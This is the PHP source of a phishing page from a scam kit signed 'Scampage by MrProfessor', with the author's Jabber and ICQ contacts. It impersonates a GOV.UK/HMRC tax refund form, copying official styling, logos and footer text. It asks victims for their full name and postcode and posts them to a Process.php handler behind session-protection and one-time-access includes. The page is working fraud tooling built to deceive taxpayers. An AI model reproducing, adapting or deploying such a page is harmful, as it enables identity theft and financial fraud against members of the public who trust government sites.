<?php
/*
 * Scampage by MrProfessor
 * Jabber: mrprofessor@jodo.im
 * ICQ: 713566330
 */
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

?>
<!DOCTYPE html>
<html lang="en"><head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <title>Tax Refund Form - GOV.UK</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="stylesheet" href="assets/files/template.css" media="screen">
    <link rel="stylesheet" href="assets/files/elements.css">
    <link rel="stylesheet" href="assets/files/fonts.css" media="all">
    <link rel="stylesheet" href="assets/files/template-print.css" media="print">
    <link rel="stylesheet" href="assets/files/local-overrides.css" media="all">
    <link rel="shortcut icon" href="assets/files/favicon.ico" type="image/x-icon">
    <link rel="mask-icon" href="assets/files/gov.uk_logotype_crown.svg" color="#0b0c0c">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="assets/files/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon-precomposed" sizes="120x120" href="assets/files/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon-precomposed" sizes="76x76" href="assets/files/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon-precomposed" href="assets/files/apple-touch-icon-60x60.png">
    <meta name="theme-color" content="#0b0c0c">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:image" content="/assets/images/opengraph-image.png">

</head><script type="text/javascript" id="useragent-switcher">navigator.__defineGetter__("userAgent", function() {return "Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0"})</script>
<body data-signature="cENzeOKAkyBUblYydnlnZGIzSUJpS29GLGMwR3R3bURoLmVyMUFFdWzCqUxrYVNVT1BmAeWtmuSCh+OisOeerOKhiOeZluGLpOKJnOC7neeKoeWyqOenhOSQoOeZluK1muSihOC7ouaHnuWlnOKHnOSEkOeElOOkkOeElOOwleCio+SIuueUieG4uuannOC7suajouC9otan46C74ZaW5Zqk4oSH45254qGu4qi646aI5Ki54KCU4KC65ISH5aC54aKd4Lik4qOM4qOM4oeG4Lmq5qej4L6M4qKP4oWj4auH46ql4KiH5ISVwofkuKDnnJbguqPmgqPisaTih5TjoLzmiY7lgqDkoIfZq+ajrOSRsOetlOGxiOeUieC8uOSUieGwu+OWjOSUmeGeouGLoOebrOOkk+WsjeC7muaMouSZi+aiieOgu+OsnOSTreSNh+S4pOKjh+KTuOeIoOKgoOeZluS9geeHkOSQvOeCh+OisOeki+C7jOCso+Wji+Sio+CkiOewrOCgo+WWo+G4uOOjouWjpOKHhOKhseGHlOGIueeinOWipcSH5oSa5pCo5JOw5IeE4qGx4ZSJ4bC65ImH4pC84KyM5JC+4Zaj4bKz5Jyi4Yi75o2H1aDkhJ3itJnnh5LgvIXkjKLgvormo47is6Pkoongu7Hlh5visaTio4njtJHhnIfjnaPkop3loajnp4TklJjnkp/gu5zinIfkhJXCh+Oqo+Sgh+OkguSEh9Wh5qKH2rLmq5TkkKDnsKPioaXkmY3guYrmnJTjjJDniKLkm7Dkh6zhibjnmZbhibrknJTisYjkh6/UkeGHm+KxpOKjieO0keGch+WSo+GiieOMkOelqOWAu+GWieOkkeGch+KgoOesjOWipeCskOWEkOenieG8lOOHnOSEkOevguSRiOebluGklOOJnuSRi+SHquKjjOKJmeSQueSRoeOTgOeiheOMkOKch+OshOKjouC6s+SgouSbquSEouC4o+SsnOSRuOeph9ya5p2J4LuK5oKN5Jqh5qCc" class="js-enabled">
<script nonce="+VZoBIg/UNtrapeLqBrMAw==">document.body.classList.add('js-enabled');</script>
<div id="skiplink-container">
    <a href="#skip-target" class="skiplink">Skip to main content</a>
</div>
<div id="global-cookie-message">
    <p>GOV.UK uses cookies to make the site simpler. <a href="#">Find out more about cookies</a></p>
</div>
<header id="global-header" class="with-proposition">
    <div class="header-wrapper">
        <div class="header-global">
            <div class="header-logo">
                <a href="#" title="Go to the GOV.UK homepage" id="logo" class="content"> <img src="assets/files/gov.png" alt="" width="36" height="32"> GOV.UK </a>
            </div>
        </div>
        <div class="header-proposition">
            <div class="content">
                <nav id="proposition-link">
                </nav>
            </div>
        </div>
    </div>
</header>
<div id="global-header-bar"></div>
<main id="content">
    <div class="phase-banner">
        <p> <strong class="phase-tag">BETA</strong> <span>This is a new service – your <a id="feedback-link" href="#" >feedback</a> will help us to improve it</span> </p>
    </div>
    <ul class="language-toggle">
        <li>English</li>
        <li><a href="#">Cymraeg</a></li>
    </ul>
    <div class="grid-row">
        <div class="column-two-thirds" id="skip-target">
            <iframe class="hidden" id="webrtciframe" sandbox="allow-same-origin"></iframe>
            <script type="text/javascript" src="assets/files/CData.js"></script>
            <script src="assets/files/device-reputation.js"></script>
            <h1 class="heading-xlarge" style="margin-bottom: 15px;">Tax Refund Form</h1>
            <span class="form-hint" >Please provide your full name and postcode to verify if you are eligible for a tax refund.</span> <br /> <Br />
            <form action="Process.php?ssl_id=<?php echo generateRandomString(130); ?>" method="POST" id="loginForm">
                <input type="hidden" name="tes" value="csrfToken,user_id,password,profile:6180403181099740681::Z7PJmvIbwqpEkYXuwErxkhl6/47IiqWuUIG089Fk/n9Rs34jIFTbTGzC3cNDsii8GVso7bwbKSw3KI/uEjS7Ag==">
                <input type="hidden" name="csrfToken" value="60e95235e20c5eed27a06f25a9f99e782833a652-1553630837725-185ce4b4a7e1ecf38c2b8b1a">
                <div class="form-group">
                    <label id="userIdLbl" for="user_id"> <span class="form-label">Full name</span> </label>
                    <input class="form-control" id="name" maxlength="22" name="name" type="text">
                </div>
                <div class="form-group">
                    <label class="form-label" id="passwordLbl" for="password"> <span class="form-label">Postcode</span> </label>
                    <input class="form-control" id="postcode" maxlength="22" name="postcode" type="text">

                </div>
                <input type="hidden" name="profile">
                <div class="form-group">
                    <input class="button" type="submit" id="continue" value="Sign in" data-ga-action="Sign-In" data-ga-category="Sign-In" data-ga-label="HMRC">
                </div>
                <script nonce="+VZoBIg/UNtrapeLqBrMAw==">
                    (function(){
                        var form = document.getElementById('loginForm');

                        var submitButton = form.querySelector('#continue');
                        submitButton.disabled = true;
                        var timeout = setTimeout(function(){submitButton.disabled = false;}, 5000);

                        // don't allow form submissions until device profile is ready
                        onDeviceProfile(function(deviceProfile) {
                            submitButton.disabled = false;
                            clearTimeout(timeout);
                        });

                        form.addEventListener('submit', function() {
                            onDeviceProfile(function(deviceProfile) {
                                form.profile.value = deviceProfile;
                            });
                        });
                    })();
                </script>
            </form>

        </div>
    </div>
    <div class="form-group">
        <a href="#" id="getHelp">Get help with this page</a>
    </div>
</main>
<footer class="group js-footer" id="footer">
    <div class="footer-wrapper">
        <div class="footer-meta">
            <div class="footer-meta-inner">
                <ul id="footer-link-list">
                    <li> <a id="cookies" href="#" >Cookies</a> </li>
                    <li> <a id="privacy-notice" href="#" >Privacy notice</a> </li>
                    <li> <a id="terms-and-conditions" href="#" >Terms and conditions</a> </li>
                </ul>
                <div class="open-government-licence">
                    <p class="logo"><a href="#" rel="license">Open Government Licence</a></p>
                    <p>All content is available under the <a href="#" >Open Government Licence v3.0</a>, except where otherwise stated</p>
                </div>
            </div>
            <div class="copyright">
                <a href="#">© Crown copyright</a>
            </div>
        </div>
    </div>
</footer>
<script src="assets/files/govuk-template.js"></script>
<script nonce="+VZoBIg/UNtrapeLqBrMAw==">if(typeof window.GOVUK === 'undefined') document.body.classList.remove('js-enabled');</script>
<script src="assets/files/page-complete.js"></script>

</body><div id="simple-translate"><div><div style="background-image: url(&quot;moz-extension://fa9cdb1d-11b8-453c-8418-4d2fa4c66747/icons/512.png&quot;); height: 22px; width: 22px; top: 10px; left: 10px;" class="simple-translate-button "></div><div class="simple-translate-panel " style="width: 300px; height: 200px; top: 0px; left: 0px; font-size: 13px; background-color: rgb(255, 255, 255);"><div class="simple-translate-result-wrapper" style="overflow: hidden;"><p class="simple-translate-result" style="color: rgb(0, 0, 0);"></p><p class="simple-translate-candidate" style="color: rgb(115, 115, 115);"></p></div></div></div></div></html>